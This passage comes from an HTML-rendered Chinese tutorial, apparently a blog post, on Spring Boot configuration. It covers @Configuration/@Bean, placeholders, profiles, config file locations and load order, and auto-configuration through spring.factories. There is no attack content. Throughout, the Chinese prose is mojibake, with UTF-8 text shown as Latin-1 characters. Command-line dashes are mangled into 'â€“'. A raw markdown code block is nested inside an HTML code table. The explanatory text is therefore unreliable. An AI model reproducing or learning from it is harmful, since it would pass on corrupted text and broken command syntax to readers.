ç»„ä»¶çš„æ–¹å¼ï¼›æ¨èä½¿ç”¨å…¨æ³¨è§£çš„æ–¹å¼</p><p>1ã€é…ç½®ç±»**@Configuration**â€”â€”&gt;Springé…ç½®æ–‡ä»¶</p><p>2ã€ä½¿ç”¨**@Bean**ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Configuration</span>ï¼šæŒ‡æ˜å½“å‰ç±»æ˜¯ä¸€ä¸ªé…ç½®ç±»ï¼›å°±æ˜¯æ¥æ›¿ä»£ä¹‹å‰çš„Springé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åœ¨é…ç½®æ–‡ä»¶ä¸­ç”¨&lt;bean&gt;&lt;bean/&gt;æ ‡ç­¾æ·»åŠ ç»„ä»¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAppConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†æ–¹æ³•çš„è¿”å›å€¼æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼›å®¹å™¨ä¸­è¿™ä¸ªç»„ä»¶é»˜è®¤çš„idå°±æ˜¯æ–¹æ³•å</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">helloService02</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é…ç½®ç±»@Beanç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶äº†...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##4ã€é…ç½®æ–‡ä»¶å ä½ç¬¦</p><h3><span id="1-éšæœºæ•°">1ã€éšæœºæ•°</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;random.value&#125;ã€$&#123;random.<span class="type">int</span>&#125;ã€$&#123;random.<span class="type">long</span>&#125;</span><br><span class="line">$&#123;random.<span class="type">int</span>(<span class="number">10</span>)&#125;ã€$&#123;random.<span class="type">int</span>[<span class="number">1024</span>,<span class="number">65536</span>]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="2-å ä½ç¬¦è·å–ä¹‹å‰é…ç½®çš„å€¼å¦‚æœæ²¡æœ‰å¯ä»¥æ˜¯ç”¨æŒ‡å®šé»˜è®¤å€¼">2ã€å ä½ç¬¦è·å–ä¹‹å‰é…ç½®çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰å¯ä»¥æ˜¯ç”¨:æŒ‡å®šé»˜è®¤å€¼</span></h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person.last-name</span>=<span class="string">å¼ ä¸‰$&#123;random.uuid&#125;</span></span><br><span class="line"><span class="attr">person.age</span>=<span class="string">$&#123;random.int&#125;</span></span><br><span class="line"><span class="attr">person.birth</span>=<span class="string">2017/12/15</span></span><br><span class="line"><span class="attr">person.boss</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">person.maps.k1</span>=<span class="string">v1</span></span><br><span class="line"><span class="attr">person.maps.k2</span>=<span class="string">14</span></span><br><span class="line"><span class="attr">person.lists</span>=<span class="string">a,b,c</span></span><br><span class="line"><span class="attr">person.dog.name</span>=<span class="string">$&#123;person.hello:hello&#125;_dog</span></span><br><span class="line"><span class="attr">person.dog.age</span>=<span class="string">15</span></span><br></pre></td></tr></table></figure><h2><span id="5-profile">5ã€Profile</span></h2><h3><span id="1-å¤šprofileæ–‡ä»¶">1ã€å¤šProfileæ–‡ä»¶</span></h3><p>æˆ‘ä»¬åœ¨ä¸»é…ç½®æ–‡ä»¶ç¼–å†™çš„æ—¶å€™ï¼Œæ–‡ä»¶åå¯ä»¥æ˜¯   application-{profile}.properties&#x2F;yml</p><p>é»˜è®¤ä½¿ç”¨application.propertiesçš„é…ç½®ï¼›</p><h3><span id="2-ymlæ”¯æŒå¤šæ–‡æ¡£å—æ–¹å¼">2ã€ymlæ”¯æŒå¤šæ–‡æ¡£å—æ–¹å¼</span></h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">prod</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8084</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">prod</span>  <span class="comment">#æŒ‡å®šå±äºå“ªä¸ªç¯å¢ƒ</span></span><br></pre></td></tr></table></figure><h3><span id="3-æ¿€æ´»æŒ‡å®šprofile">3ã€æ¿€æ´»æŒ‡å®šprofile</span></h3><p>â€‹1ã€åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š  spring.profiles.active&#x3D;dev</p><p>â€‹2ã€å‘½ä»¤è¡Œï¼š</p><p>â€‹java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar â€“spring.profiles.active&#x3D;devï¼›</p><p>â€‹å¯ä»¥ç›´æ¥åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œé…ç½®ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°</p><p>â€‹3ã€è™šæ‹Ÿæœºå‚æ•°ï¼›</p><p>â€‹-Dspring.profiles.active&#x3D;dev</p><h2><span id="6-é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®">6ã€é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®</span></h2><p>springboot å¯åŠ¨ä¼šæ‰«æä»¥ä¸‹ä½ç½®çš„application.propertiesæˆ–è€…application.ymlæ–‡ä»¶ä½œä¸ºSpring bootçš„é»˜è®¤é…ç½®æ–‡ä»¶</p><p>â€“file:.&#x2F;config&#x2F;</p><p>â€“file:.&#x2F;</p><p>â€“classpath:&#x2F;config&#x2F;</p><p>â€“classpath:&#x2F;</p><p>ä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ï¼Œé«˜ä¼˜å…ˆçº§çš„é…ç½®ä¼šè¦†ç›–ä½ä¼˜å…ˆçº§çš„é…ç½®ï¼›</p><p>SpringBootä¼šä»è¿™å››ä¸ªä½ç½®å…¨éƒ¨åŠ è½½ä¸»é…ç½®æ–‡ä»¶ï¼›<strong>äº’è¡¥é…ç½®</strong>ï¼›</p><p>&#x3D;&#x3D;æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡spring.config.locationæ¥æ”¹å˜é»˜è®¤çš„é…ç½®æ–‡ä»¶ä½ç½®&#x3D;&#x3D;</p><p><strong>é¡¹ç›®æ‰“åŒ…å¥½ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°çš„å½¢å¼ï¼Œå¯åŠ¨é¡¹ç›®çš„æ—¶å€™æ¥æŒ‡å®šé…ç½®æ–‡ä»¶çš„æ–°ä½ç½®ï¼›æŒ‡å®šé…ç½®æ–‡ä»¶å’Œé»˜è®¤åŠ è½½çš„è¿™äº›é…ç½®æ–‡ä»¶å…±åŒèµ·ä½œç”¨å½¢æˆäº’è¡¥é…ç½®ï¼›</strong></p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar â€“spring.config.location&#x3D;G:&#x2F;application.properties</p><h2><span id="7-å¤–éƒ¨é…ç½®åŠ è½½é¡ºåº">7ã€å¤–éƒ¨é…ç½®åŠ è½½é¡ºåº</span></h2><p><strong>&#x3D;&#x3D;SpringBootä¹Ÿå¯ä»¥ä»ä»¥ä¸‹ä½ç½®åŠ è½½é…ç½®ï¼› ä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼›é«˜ä¼˜å…ˆçº§çš„é…ç½®è¦†ç›–ä½ä¼˜å…ˆçº§çš„é…ç½®ï¼Œæ‰€æœ‰çš„é…ç½®ä¼šå½¢æˆäº’è¡¥é…ç½®&#x3D;&#x3D;</strong></p><p><strong>1.å‘½ä»¤è¡Œå‚æ•°</strong></p><p>æ‰€æœ‰çš„é…ç½®éƒ½å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸Šè¿›è¡ŒæŒ‡å®š</p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar â€“server.port&#x3D;8087  â€“server.context-path&#x3D;&#x2F;abc</p><p>å¤šä¸ªé…ç½®ç”¨ç©ºæ ¼åˆ†å¼€ï¼› â€“é…ç½®é¡¹&#x3D;å€¼</p><p>2.æ¥è‡ªjava:comp&#x2F;envçš„JNDIå±æ€§</p><p>3.Javaç³»ç»Ÿå±æ€§ï¼ˆSystem.getProperties()ï¼‰</p><p>4.æ“ä½œç³»ç»Ÿç¯å¢ƒå˜é‡</p><p>5.RandomValuePropertySourceé…ç½®çš„random.*å±æ€§å€¼</p><p>&#x3D;&#x3D;<strong>ç”±jaråŒ…å¤–å‘jaråŒ…å†…è¿›è¡Œå¯»æ‰¾ï¼›</strong>&#x3D;&#x3D;</p><p>&#x3D;&#x3D;<strong>ä¼˜å…ˆåŠ è½½å¸¦profile</strong>&#x3D;&#x3D;</p><p><strong>6.jaråŒ…å¤–éƒ¨çš„application-{profile}.propertiesæˆ–application.yml(å¸¦spring.profile)é…ç½®æ–‡ä»¶</strong></p><p><strong>7.jaråŒ…å†…éƒ¨çš„application-{profile}.propertiesæˆ–application.yml(å¸¦spring.profile)é…ç½®æ–‡ä»¶</strong></p><p>&#x3D;&#x3D;<strong>å†æ¥åŠ è½½ä¸å¸¦profile</strong>&#x3D;&#x3D;</p><p><strong>8.jaråŒ…å¤–éƒ¨çš„application.propertiesæˆ–application.yml(ä¸å¸¦spring.profile)é…ç½®æ–‡ä»¶</strong></p><p><strong>9.jaråŒ…å†…éƒ¨çš„application.propertiesæˆ–application.yml(ä¸å¸¦spring.profile)é…ç½®æ–‡ä»¶</strong></p><p>10.@Configurationæ³¨è§£ç±»ä¸Šçš„@PropertySource</p><p>11.é€šè¿‡SpringApplication.setDefaultPropertiesæŒ‡å®šçš„é»˜è®¤å±æ€§</p><p>æ‰€æœ‰æ”¯æŒçš„é…ç½®åŠ è½½æ¥æºï¼›</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#boot-features-external-config">å‚è€ƒå®˜æ–¹æ–‡æ¡£</a></p><h2><span id="8-è‡ªåŠ¨é…ç½®åŸç†">8ã€è‡ªåŠ¨é…ç½®åŸç†</span></h2><p>é…ç½®æ–‡ä»¶åˆ°åº•èƒ½å†™ä»€ä¹ˆï¼Ÿæ€ä¹ˆå†™ï¼Ÿè‡ªåŠ¨é…ç½®åŸç†ï¼›</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#common-application-properties">é…ç½®æ–‡ä»¶èƒ½é…ç½®çš„å±æ€§å‚ç…§</a></p><h3><span id="1-è‡ªåŠ¨é…ç½®åŸç†">1ã€<strong>è‡ªåŠ¨é…ç½®åŸç†ï¼š</strong></span></h3><p>1ï¼‰ã€SpringBootå¯åŠ¨çš„æ—¶å€™åŠ è½½ä¸»é…ç½®ç±»ï¼Œå¼€å¯äº†è‡ªåŠ¨é…ç½®åŠŸèƒ½ &#x3D;&#x3D;@EnableAutoConfiguration&#x3D;&#x3D;</p><p><strong>2ï¼‰ã€@EnableAutoConfiguration ä½œç”¨ï¼š</strong></p><ul><li><p>åˆ©ç”¨EnableAutoConfigurationImportSelectorç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€äº›ç»„ä»¶ï¼Ÿ</p></li><li><p>å¯ä»¥æŸ¥çœ‹selectImports()æ–¹æ³•çš„å†…å®¹ï¼›</p></li><li><p>List<string> configurations &#x3D; getCandidateConfigurations(annotationMetadata,      attributes);è·å–å€™é€‰çš„é…ç½®</string></p><ul><li><pre><code class="java">SpringFactoriesLoader.loadFactoryNames()æ‰«ææ‰€æœ‰jaråŒ…ç±»è·¯å¾„ä¸‹  META-INF/spring.factoriesæŠŠæ‰«æåˆ°çš„è¿™äº›æ–‡ä»¶çš„å†…å®¹åŒ…è£…æˆpropertieså¯¹è±¡ä»propertiesä¸­è·å–åˆ°EnableAutoConfiguration.classç±»ï¼ˆç±»åï¼‰å¯¹åº”çš„å€¼ï¼Œç„¶åæŠŠä»–ä»¬æ·»åŠ åœ¨å®¹å™¨ä¸­<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">**==å°† ç±»è·¯å¾„ä¸‹  META-INF/spring.factories é‡Œé¢é…ç½®çš„æ‰€æœ‰EnableAutoConfigurationçš„å€¼åŠ å…¥åˆ°äº†å®¹å™¨ä¸­ï¼›==**</span><br><span class="line"></span><br><span class="line">```properties</span><br><span class="line"># Auto Configure</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>æ¯ä¸€ä¸ªè¿™æ ·çš„  xxxAutoConfigurationç±»éƒ½æ˜¯å®¹å™¨ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œéƒ½åŠ å…¥åˆ°å®¹å™¨ä¸­ï¼›ç”¨ä»–ä»¬æ¥åšè‡ªåŠ¨é…ç½®ï¼›</p><p>3ï¼‰ã€æ¯ä¸€ä¸ªè‡ªåŠ¨é…ç½®ç±»è¿›è¡Œè‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼›</p><p>4ï¼‰ã€ä»¥<strong>HttpEncodingAutoConfigurationï¼ˆHttpç¼–ç è‡ªåŠ¨é…ç½®ï¼‰</strong>ä¸ºä¾‹è§£é‡Šè‡ªåŠ¨é…ç½®åŸç†ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>   <span class="comment">//è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»ï¼Œä»¥å‰ç¼–å†™çš„é…ç½®æ–‡ä»¶ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(HttpEncodingProperties.class)</span>  <span class="comment">//å¯åŠ¨æŒ‡å®šç±»çš„ConfigurationPropertiesåŠŸèƒ½ï¼›å°†é…ç½®æ–‡ä»¶ä¸­å¯¹åº”çš„å€¼å’ŒHttpEncodingPropertiesç»‘å®šèµ·æ¥ï¼›å¹¶æŠŠHttpEncodingPropertiesåŠ å…¥åˆ°iocå®¹å™¨ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span> <span class="comment">//Springåº•å±‚@Conditionalæ³¨è§£ï¼ˆSpringæ³¨è§£ç‰ˆï¼‰ï¼Œæ ¹æ®ä¸åŒçš„æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³æŒ‡å®šçš„æ¡ä»¶ï¼Œæ•´ä¸ªé…ç½®ç±»é‡Œé¢çš„é…ç½®å°±ä¼šç”Ÿæ•ˆï¼›    åˆ¤æ–­å½“å‰åº”ç”¨æ˜¯å¦æ˜¯webåº”ç”¨ï¼Œå¦‚æœæ˜¯ï¼Œå½“å‰é…ç½®ç±»ç”Ÿæ•ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnClass(CharacterEncodingFilter.class)</span>  <span class="comment">//åˆ¤æ–­å½“å‰é¡¹ç›®æœ‰æ²¡æœ‰è¿™ä¸ªç±»CharacterEncodingFilterï¼›SpringMVCä¸­è¿›è¡Œä¹±ç è§£å†³çš„è¿‡æ»¤å™¨ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.http.encoding&quot;, value = &quot;enabled&quot;, matchIfMissing = true)</span> 